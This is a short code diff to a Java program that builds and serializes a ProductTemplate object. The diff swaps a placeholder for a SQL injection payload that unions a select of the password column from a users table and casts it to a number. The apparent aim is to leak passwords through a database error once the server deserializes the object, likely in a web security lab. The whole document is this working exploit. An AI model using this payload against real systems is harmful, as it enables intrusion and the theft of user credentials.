@@ -8,7 +8,7 @@ import java.util.Base64;
 
 class Main {
     public static void main(String[] args) throws Exception {
-        ProductTemplate originalObject = new ProductTemplate("your-payload-here");
+        ProductTemplate originalObject = new ProductTemplate("' UNION SELECT NULL, NULL, NULL, cast(password as numeric), NULL, NULL, NULL, NULL FROM users--");
 
         String serializedObject = serialize(originalObject);
 
